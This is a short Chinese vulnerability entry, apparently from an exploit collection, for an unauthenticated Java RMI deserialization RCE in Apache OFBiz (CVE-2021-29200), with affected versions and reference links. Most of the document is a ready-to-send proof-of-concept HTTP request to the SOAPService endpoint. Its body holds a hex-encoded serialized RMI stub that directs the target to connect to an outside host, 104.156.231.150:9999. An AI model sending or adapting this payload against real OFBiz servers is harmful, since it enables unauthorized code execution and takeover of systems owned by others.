[Apache OFBiz RMI反序列化漏洞 CVE-2021-26295](Apache%20OFBiz%20RMI反序列化漏洞%20CVE-2021-26295.md)# Apache OFBiz RMI Bypass RCE CVE-2021-29200

# 漏洞描述

由于 Apache OFBiz 存在 Java RMI 反序列化漏洞，未经身份验证的用户可以执行 RCE 攻击，导致服务器被接管。

参考链接：

- https://mp.weixin.qq.com/s/vM0pXZ5mhusFBsj1xD-2zw
- https://xz.aliyun.com/t/9556

# 漏洞影响

```
Apache OFBiz < 17.12.07
```

# 漏洞复现

poc：

```
POST /webtools/control/SOAPService HTTP/1.1
Host: xxx
User-Agent: python-requests/2.24.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: text/xml
Content-Length: 877


<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://ofbiz.apache.org/service/">  
  <soapenv:Header/>  
  <soapenv:Body>
    <ser>
      <map-Map>
        <map-Entry>
          <map-Key>
            <cus-obj>ACED0005737200326A617661782E6D616E6167656D656E742E72656D6F74652E726D692E524D49436F6E6E656374696F6E496D706C5F5374756200000000000000020200007872001A6A6176612E726D692E7365727665722E52656D6F746553747562ECC98BE1651A0200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707738000A556E6963617374526566000F3130342E3135362E3233312E3135300000270FFFFFFFFFEF34D1DB00000000000000000000000000000078</cus-obj>
          </map-Key>  
          <map-Value>  
            <std-String/>
          </map-Value>
        </map-Entry>
      </map-Map>
    </ser>
  </soapenv:Body>
</soapenv:Envelope>
```
